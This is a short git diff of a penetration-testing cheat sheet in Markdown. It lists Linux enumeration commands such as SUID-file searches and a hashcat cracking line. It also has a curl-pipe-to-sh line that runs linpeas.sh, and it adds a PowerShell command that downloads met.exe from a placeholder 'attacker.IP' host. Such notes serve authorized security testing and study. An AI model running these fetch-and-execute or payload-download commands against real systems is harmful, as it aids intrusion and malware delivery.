@@ -47,19 +47,19 @@
 `cat /etc/bashrc`<br>
 `cat ~/.bash_profile`<br>
 `cat ~/.bashrc`<br>
-`ps aux`<br>
 `ps -elf`<br>
 `find / -perm -u=s -type f 2>/dev/null`<br>
 `find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null`<br>
 `find / -perm -u=s -type f 2>/dev/null`<br>
 `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`<br>
 
-Also use LinPEAS or LinENUM
-
 ## Exploit
 
 #### Password Cracking
 `hashcat -a 0 -m #hash_type hash.txt dictionary_list.txt`<br>
+
+#### Transfers
+`PS iwr -uri http://attacker.IP/met.exe -Outfile met.exe`<br>
 
 ## Pivoting and Tunneling
 
